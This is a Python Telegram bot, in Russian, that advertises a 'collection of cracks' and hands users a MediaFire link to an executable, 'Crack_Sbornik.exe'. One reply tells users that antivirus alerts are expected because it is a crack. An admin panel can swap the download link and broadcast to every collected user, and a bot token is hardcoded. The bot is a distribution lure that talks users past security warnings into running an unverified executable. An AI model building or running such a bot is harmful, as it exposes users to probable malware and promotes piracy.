import os
import time
import threading
from flask import Flask, request
import telebot
from telebot import types

TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ЗАМЕНИТЕ НА СВОЙ ТОКЕН
SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
IMAGE_URL = "https://i.ibb.co/KpKqsd8x/gg.png"

# ВСТАВЬТЕ СВОЙ TELEGRAM ID
ADMIN_ID = 7859226148  # ЗАМЕНИТЕ НА СВОЙ ID

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Статистика
download_count = 0
users = set()
user_last_use = {}

def check_cooldown(user_id):
    current_time = time.time()
    if user_id in user_last_use:
        time_passed = current_time - user_last_use[user_id]
        if time_passed < 5:
            return int(5 - time_passed)
    return 0

def update_cooldown(user_id):
    user_last_use[user_id] = time.time()

def is_admin(user_id):
    return user_id == ADMIN_ID

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    users.add(user_id)
    
    remaining = check_cooldown(user_id)
    if remaining > 0:
        bot.send_message(message.chat.id, f"⏳ Подожди {remaining} секунд!")
        return
    
    update_cooldown(user_id)
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("📥 Скачать софт", callback_data="download")
    button2 = types.InlineKeyboardButton("🎯 Подробнее", callback_data="more")
    button3 = types.InlineKeyboardButton("👥 Поделиться", callback_data="share")
    keyboard.add(button1, button2, button3)
    
    bot.send_message(message.chat.id, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=keyboard)

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ У вас нет доступа!")
        return
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    btn2 = types.InlineKeyboardButton("📝 Сменить ссылку", callback_data="admin_change_link")
    btn3 = types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users")
    btn4 = types.InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")
    btn5 = types.InlineKeyboardButton("🖼 Сменить картинку", callback_data="admin_change_image")
    keyboard.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(message.chat.id, "🔧 **Админ-панель**", parse_mode="Markdown", reply_markup=keyboard)

# Обработчик для обычных кнопок (НЕ админских)
@bot.callback_query_handler(func=lambda call: call.data in ["download", "more", "share"])
def user_callback(call):
    global download_count
    
    user_id = call.from_user.id
    users.add(user_id)
    
    remaining = check_cooldown(user_id)
    if remaining > 0:
        bot.answer_callback_query(call.id, f"⏳ Подожди {remaining} сек!", show_alert=True)
        return
    
    update_cooldown(user_id)
    
    if call.data == "download":
        download_count += 1
        bot.answer_callback_query(call.id, "✅ Ссылка отправлена!")
        bot.send_message(call.message.chat.id, f"🔗 **Ссылка для скачивания:**\n{SOFT_LINK}", parse_mode="Markdown")
    
    elif call.data == "more":
        bot.answer_callback_query(call.id, "📸 Картинка отправлена!")
        bot.send_photo(call.message.chat.id, IMAGE_URL, caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️")
    
    elif call.data == "share":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"👥 **Поделиться ботом:**\n\nhttps://t.me/{bot.get_me().username}\n\n📎 Отправь эту ссылку друзьям!", parse_mode="Markdown")

# Обработчик для админских кнопок
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    global download_count, SOFT_LINK, IMAGE_URL
    
    user_id = call.from_user.id
    users.add(user_id)
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "❌ Нет доступа!", show_alert=True)
        return
    
    if call.data == "admin_stats":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"📊 **Статистика:**\n\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}", parse_mode="Markdown")
    
    elif call.data == "admin_users":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"👥 **Всего пользователей:** {len(users)}")
    
    elif call.data == "admin_change_link":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📝 **Отправьте новую ссылку для скачивания:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, change_link)
    
    elif call.data == "admin_change_image":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🖼 **Отправьте новую ссылку на картинку:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, change_image)
    
    elif call.data == "admin_broadcast":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📢 **Введите текст для рассылки:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, broadcast)

def change_link(message):
    global SOFT_LINK
    SOFT_LINK = message.text.strip()
    bot.send_message(message.chat.id, f"✅ Ссылка успешно изменена!\n\n🔗 Новая ссылка:\n{SOFT_LINK}")

def change_image(message):
    global IMAGE_URL
    IMAGE_URL = message.text.strip()
    bot.send_message(message.chat.id, f"✅ Картинка успешно изменена!\n\n🖼 Новая ссылка:\n{IMAGE_URL}")

def broadcast(message):
    text = message.text.strip()
    success = 0
    fail = 0
    
    bot.send_message(message.chat.id, "📢 **Начинаю рассылку...**\n\n⏳ Это может занять некоторое время", parse_mode="Markdown")
    
    for user_id in users:
        try:
            bot.send_message(user_id, f"📢 **Новость от админа:**\n\n{text}", parse_mode="Markdown")
            success += 1
        except:
            fail += 1
        time.sleep(0.05)
    
    bot.send_message(message.chat.id, f"✅ **Рассылка завершена!**\n\n📨 Доставлено: {success}\n❌ Ошибок: {fail}")

# Webhook для Render
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bad Request', 400

@app.route('/')
def index():
    return "Bot is running!"

@app.route('/healthz')
def health():
    return "OK"

if __name__ == "__main__":
    # Удаляем старый webhook
    bot.remove_webhook()
    time.sleep(1)
    
    # Устанавливаем новый webhook
    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'bot-tg-1-tw5w.onrender.com')}/webhook"
    bot.set_webhook(url=webhook_url)
    print(f"✅ Webhook установлен: {webhook_url}")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
